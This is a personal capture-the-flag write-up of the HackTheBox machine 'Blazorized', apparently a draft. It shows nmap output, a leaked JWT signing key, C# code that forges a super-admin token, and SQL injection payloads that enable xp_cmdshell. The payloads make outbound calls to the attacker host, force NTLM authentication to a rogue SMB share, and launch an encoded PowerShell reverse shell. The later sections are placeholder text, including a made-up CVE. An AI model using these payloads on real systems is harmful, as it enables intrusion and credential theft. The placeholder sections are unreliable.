```json
Alias: Blazorized
Date: 01-11_2024
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.10.11.22
```

# Blazorized
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-01 18:33 PKT
Nmap scan report for 10.10.11.22
Host is up (0.14s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-01 13:33:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RTM+
| ms-sql-info:
|   10.10.11.22\BLAZORIZED:
|     Instance name: BLAZORIZED
|     Version:
|       name: Microsoft SQL Server 2022 RTM+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-01T04:01:20
|_Not valid after:  2054-11-01T04:01:20
|_ssl-date: 2024-11-01T13:34:23+00:00; +1s from scanner time.
| ms-sql-ntlm-info:
|   10.10.11.22\BLAZORIZED:
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-01T13:34:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.23 seconds
```
## Discovered Subdomains
```
blazorized.htb
admin.blazorized.htb
api.blazorized.htb
```

---
# Enumeration

There is an HTTP Server running on port 80. If we browse to `/check_update` and inspect requests, we will notice that it loads `/_framework/Blazorized.Helpers.dll`. We can download this file and inspect it with `ILSpy`. It contains the secret key used for hashing the `JWT` Token. With this secret key, we can generate our own `JWT` token.

To do this, I setup a `dotnet` environment as such:

```sh
dotnet new console -o JWTApp
dotnet add package System.IdentityModel.Tokens.Jwt
```

Next copying the code from `ILSpy`:

```cs
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;

public static class JWT
{
	private const long EXPIRATION_DURATION_IN_SECONDS = 60L;

	private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";

	private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";

	private static readonly string postsPermissionsClaimValue = "Posts_Get_All";

	private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";

	private static readonly string superAdminRoleClaimValue = "Super_Admin";

	private static readonly string issuer = "http://api.blazorized.htb";

	private static readonly string apiAudience = "http://api.blazorized.htb";

	private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";

	private static SigningCredentials GetSigningCredentials()
	{
		try
		{
			return new SigningCredentials((SecurityKey)new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtSymmetricSecurityKey)), "HS512");
		}
		catch (Exception)
		{
			throw;
		}
	}

	public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 99999999L)
	{
		try
		{
			List<Claim> list = new List<Claim>
			{
				new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", superAdminEmailClaimValue),
				new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", superAdminRoleClaimValue)
			};
			string text = issuer;
			string text2 = adminDashboardAudience;
			SigningCredentials signingCredentials = GetSigningCredentials();
			DateTime? dateTime = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
			JwtSecurityToken val = new JwtSecurityToken(text, text2, (IEnumerable<Claim>)list, (DateTime?)null, dateTime, signingCredentials);
			return ((SecurityTokenHandler)new JwtSecurityTokenHandler()).WriteToken((SecurityToken)(object)val);
		}
		catch (Exception)
		{
			throw;
		}
	}

    static void Main(String[] args) {
        Console.WriteLine("Generating SuperAdmin JWT");
        String jwt = GenerateSuperAdminJWT();
        Console.WriteLine("Token: " + jwt);
    }

}
```


save it as `Program.cs` and run using:

```shell
dotnet run
```

With this we should get an usable `JWT` admin token.

Next, trying to set the `JWT` token at `admin.blazorized.htb` the same way as it was in `api.blazorized.htb` doesn't work. So I tried a few different name by setting the cookie in local storage and finally, the key named `jwt` worked. 

For command execution, We can use stacked queries in the `Check Duplicate Category Name` or `Check Duplicate Posts`. To confirm it works, We can setup a server, enable `xp_cmdshell` and make a request to our server.

```
Computer Science'; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://10.10.14.132:8000/test'--
```

Try this payload and we get a hit!

![[Pasted image 20241104212414.png]]

We could also try cracking the password for the user the `SQLServer` is running as. The `xp_dirtree` command lists the content of a directory on the system, or on a remote SMB Share, so we could use `xp_dirtree` to make the user connect to our SMB share and steal their NTLM.

Setup a SMB Server using `impacket-smbserver`, and connect to it using the following payload

```sh
a'; EXEC master.sys.xp_dirtree '\\10.10.14.132\share';--
```

and we get the hashes for the `DC$` computer account and `NU_1055`. We don't even need to try to crack the `DC$` because it's a computer account with a long and complex password but unfortunately, I couldn't manage to crack the `NTLM` for `NU_1055` as well.

Oh well, we still have code execution.

I managed to get a reverse shell with the following payload

```
Computer Science'; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADIAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'--
```

And we get a shell as `nu_1055`.

---

# Exploitation

## CVE-2099-123

---

# Lateral Movement

## Local Enumeration
Lorem ipsum dolor sit amet.

## Lateral Movement Vector
Lorem ipsum dolor sit amet.

---

# Privilege Escalation

## Local Enumeration
Lorem ipsum dolor sit amet.

## Privilege Escalation Vector
Lorem ipsum dolor sit amet.

---

# Flags
- user.txt
- root.txt

#CTF